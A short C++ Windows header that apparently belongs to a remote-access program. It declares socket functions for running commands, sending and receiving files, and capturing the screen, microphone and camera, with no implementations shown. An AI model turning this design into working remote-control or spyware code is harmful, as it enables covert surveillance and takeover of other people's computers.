#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#include <stdio.h>
#include <string>

#pragma comment (lib, "ws2_32.lib")
#pragma warning (disable : 4996)

using namespace std;

void waitAndConnect(SOCKET* connectSocket);
void sendFile(const char* fileName, SOCKET connectSocket);
void receiveFile(const char* fileName, SOCKET connectSocket);
void doCommandAndSend(const char* command, SOCKET connectSocket);

void Screenshot(SOCKET connectSocket);
void Micro(int milliseconds,SOCKET connectSocket);
void Camera(SOCKET connectSocket);

void sendSignal(BOOL signal, SOCKET connectSocket);
